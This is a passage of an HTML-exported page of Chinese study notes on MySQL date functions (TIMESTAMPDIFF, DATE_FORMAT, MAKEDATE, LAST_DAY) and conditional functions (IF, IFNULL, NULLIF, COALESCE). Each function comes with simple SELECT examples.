+SELECT TIMESTAMPDIFF(HOUR,&#x27;2026-05-10 10:00:00&#x27;,&#x27;2026-05-10 15:00:00&#x27;) AS 小时;
+SELECT TIMESTAMPDIFF(DAY,&#x27;2026-05-01&#x27;,&#x27;2026-05-10&#x27;) AS 天数;
+SELECT TIMESTAMPDIFF(MONTH,&#x27;2026-01-01&#x27;,&#x27;2026-05-01&#x27;) AS 月数;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80a6-a3ff-c1812bcaa8c4" class="toggle"><li><details open=""><summary>date_format()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80ae-91ec-f83bee5b1ae9" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 7. 日期格式化
+SELECT DATE_FORMAT(NOW(),&#x27;%Y-%m-%d&#x27;) AS 格式1;
+SELECT DATE_FORMAT(NOW(),&#x27;%Y/%m/%d&#x27;) AS 格式2;
+SELECT DATE_FORMAT(NOW(),&#x27;%Y-%m-%d %H:%i:%s&#x27;) AS 完整时间;
+SELECT DATE_FORMAT(NOW(),&#x27;%Y年%m月%d日&#x27;) AS 中文格式;
+SELECT DATE_FORMAT(NOW(),&#x27;%H:%i&#x27;) AS 时分;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8084-85fa-fa4e69afb638" class="toggle"><li><details open=""><summary>makedate()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-804f-8465-c0df652083a1" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 8. 拼接日期
+SELECT MAKEDATE(2026,1) AS 第一天, MAKEDATE(2026,100) AS 第100天, MAKEDATE(2026,365) AS 最后一天;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80a0-95ee-d7115c00aa11" class="toggle"><li><details open=""><summary>last_day()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80e3-8977-cf2f6e941316" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 9. 当月最后一天
+SELECT LAST_DAY(NOW()) AS 本月最后一天,
+       LAST_DAY(&#x27;2026-02-10&#x27;) AS 2月最后一天,
+       LAST_DAY(&#x27;2026-04-05&#x27;) AS 4月最后一天;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8061-85e6-c300e7a9f866" class="toggle"><li><details open=""><summary>if()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8049-b2e2-e4412e3a8511" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 1. IF 条件判断  IF(条件, 成立值, 不成立值)
+SELECT IF(10 &gt; 5, &#x27;大于&#x27;, &#x27;小于&#x27;) AS res_if1;
+SELECT IF(5 &gt; 10, &#x27;大于&#x27;, &#x27;小于&#x27;) AS res_if2;
+SELECT IF(60 &gt;= 60, &#x27;及格&#x27;, &#x27;不及格&#x27;) AS res_if3;
+SELECT IF(RAND()*10 &gt; 5, &#x27;大数&#x27;, &#x27;小数&#x27;) AS res_if4;
+SELECT IF(NULL, &#x27;有值&#x27;, &#x27;空值&#x27;) AS res_if5;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-80b1-b83f-d1f60a137567" class="toggle"><li><details open=""><summary>ifnull()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80d5-bc4d-ca7fb85e9941" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 2. IFNULL 为空判断 IFNULL(字段/表达式, 为空默认值)
+SELECT IFNULL(NULL, &#x27;暂无数据&#x27;) AS res_ifnull1;
+SELECT IFNULL(&#x27;有值&#x27;, &#x27;暂无数据&#x27;) AS res_ifnull2;
+SELECT IFNULL(&#x27;&#x27;, &#x27;空字符串默认&#x27;) AS res_ifnull3;
+SELECT IFNULL(score, 0) AS score_val FROM student_score;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8089-8f1c-c52f7498f3b3" class="toggle"><li><details open=""><summary>nullif()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-8037-a23b-d9f0c05f017c" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 3. NULLIF 相等返回NULL，不等返回第一个值 NULLIF(a,b)
+SELECT NULLIF(10,10) AS res_nullif1;
+SELECT NULLIF(10,20) AS res_nullif2;
+SELECT NULLIF(&#x27;abc&#x27;,&#x27;abc&#x27;) AS res_nullif3;
+SELECT NULLIF(&#x27;男&#x27;,&#x27;女&#x27;) AS res_nullif4;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="35c8db55-6aee-8017-8983-d4d13e2ba1a8" class="toggle"><li><details open=""><summary>coalesce()</summary><div style="display:contents" dir="auto"><pre id="35c8db55-6aee-80f4-acfa-df5c582a49c6" class="code code-wrap"><code class="language-sql" style="white-space:pre-wrap;word-break:break-all">-- 6. COALESCE 从左到右返回第一个非NULL值
+SELECT COALESCE(NULL, NULL, &#x27;默认值&#x27;, 99) AS res_coalesce1;
+SELECT COALESCE(NULL, 0, &#x27;无&#x27;) AS res_coalesce2;
+SELECT COALESCE(NULL, NULL, NULL, 666) AS res_coalesce3;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="35c8db55-6aee-80a2-ae3f-c6d330015bff" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
